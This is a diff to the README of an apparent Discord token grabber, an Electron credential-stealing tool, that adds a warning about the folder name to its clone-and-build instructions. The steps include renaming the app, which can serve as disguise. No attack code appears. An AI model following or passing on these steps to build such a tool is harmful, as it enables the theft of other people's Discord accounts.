@@ -8,7 +8,7 @@ For fun, and as a way fun/interesting way to learn more about Electron and Disco
 
 ## How to get it working
 - Run `git clone https://github.com/spinfal/discord-token-grabber.git`
-- (optional) Rename the folder to change the Electron app name
+- (optional) Rename the folder to change the Electron app name. **Do NOT set the folder name to Discord. That will mess up your actual Discord installation and you will need to reinstall Discord.**
 - Run `build.bat`
 - Answer provided prompts
 
